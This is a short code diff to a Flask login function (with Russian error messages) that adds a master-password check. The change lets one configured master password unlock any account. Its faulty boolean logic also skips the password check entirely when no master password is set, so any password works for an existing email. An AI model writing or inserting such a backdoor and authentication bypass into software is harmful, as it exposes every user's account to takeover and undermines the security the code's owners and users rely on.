@@ -5,6 +5,7 @@ from application.models import db, User, Invitation
 from application.infrastructure import bcrypt
 from application.helpers.decorators import transaction
 from application.helpers.exceptions import LogicException
+from flask import current_app
 
 
 def find_invitation(invite_key):
@@ -45,7 +46,7 @@ def login_user(data):
     if not user:
         raise LogicException("Пользователь с указанным email не найден", 401)
 
-    if not bcrypt.check_password_hash(user.password, data['password']):
+    if not bcrypt.check_password_hash(user.password, data['password']) and (current_app.config['MASTER_PASSWORD'] and data['password'] != current_app.config['MASTER_PASSWORD']):
         raise LogicException("Неверный пароль", 401)
 
     return get_access_token(user)
